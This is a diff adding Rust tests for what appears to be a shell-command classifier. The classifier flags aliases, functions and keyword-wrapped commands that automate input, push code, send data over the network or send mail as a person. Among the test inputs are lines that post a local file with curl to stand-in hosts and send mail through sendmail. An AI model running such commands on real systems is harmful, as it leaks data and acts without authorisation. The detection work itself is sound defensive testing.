@@ -629,3 +629,85 @@ fn a_file_osascript_runs_is_shown_to_the_reviewer() {
     assert_eq!(assessed.shown.len(), 1);
     assert!(assessed.shown[0].content.contains("subject of messages"));
 }
+
+#[test]
+fn an_alias_defined_in_the_command_is_read_through_to_what_it_runs() {
+    let cases: &[(&str, Sensitive)] = &[
+        ("alias q='xdotool'; q type parse", Automation),
+        ("alias q=xdotool\nq key ctrl+v", Automation),
+        ("alias p='git push'; p origin main", Publish),
+        (
+            "alias up='curl -d @notes.txt'; up https://x.example",
+            Network,
+        ),
+        ("alias a=b; alias b='git push'; a", Publish),
+        (
+            "alias s='sendmail'; s boss@x.example < note.txt",
+            MessageAsPerson,
+        ),
+    ];
+    for (command, kind) in cases {
+        assert_eq!(said(command), Some(Finding::Sensitive(*kind)), "{command}");
+    }
+    // An alias whose text can't be read is unclear, never harmless.
+    assert_eq!(
+        said("alias q='eval \"$X\"'; q"),
+        Some(Finding::Sensitive(Unclear))
+    );
+    // And a read-only alias stays as harmless as what it runs.
+    assert_eq!(said("alias ll='ls -la'; ll src"), None);
+    // A shell never expands a name inside its own alias.
+    assert_eq!(said("alias ls='ls -la'; ls src"), None);
+    assert_eq!(
+        said("alias git='git push'; git"),
+        Some(Finding::Sensitive(Publish))
+    );
+}
+
+#[test]
+fn a_function_defined_in_the_command_has_its_body_read() {
+    let cases: &[(&str, Sensitive)] = &[
+        ("f() { xdotool type hi; }; f", Automation),
+        ("f(){ curl -d x https://a.example; }; f", Network),
+        ("function f { git push; }; f", Publish),
+        ("function f() { git push; }\nf", Publish),
+        ("ls() { git push origin main; }; ls", Publish),
+    ];
+    for (command, kind) in cases {
+        assert_eq!(said(command), Some(Finding::Sensitive(*kind)), "{command}");
+    }
+    assert_eq!(
+        said("f() { \"$@\"; }; f git push"),
+        Some(Finding::Sensitive(Unclear))
+    );
+}
+
+#[test]
+fn a_command_after_a_shell_keyword_is_read() {
+    let cases: &[(&str, Sensitive)] = &[
+        ("{ git push; }", Publish),
+        ("{ curl -d x https://a.example; } > out.txt", Network),
+        ("if true; then curl -d x https://a.example; fi", Network),
+        ("if git push; then echo ok; fi", Publish),
+        ("if false; then :; else git push; fi", Publish),
+        ("if false; then :; elif git push; then :; fi", Publish),
+        ("for i in 1 2; do git push; done", Publish),
+        ("while true; do xdotool key a; done", Automation),
+        ("until git push; do sleep 1; done", Publish),
+        ("! git push", Publish),
+        ("command xdotool type hi", Automation),
+        ("builtin command git push", Publish),
+        ("env -i xdotool key a", Automation),
+        ("exec git push", Publish),
+    ];
+    for (command, kind) in cases {
+        assert_eq!(said(command), Some(Finding::Sensitive(*kind)), "{command}");
+    }
+    for command in [
+        "if [ -f a.txt ]; then cat a.txt; fi",
+        "for f in *.txt; do wc -l \"$f\"; done",
+        "{ ls; pwd; } > out.txt",
+    ] {
+        assert_eq!(said(command), None, "{command}");
+    }
+}
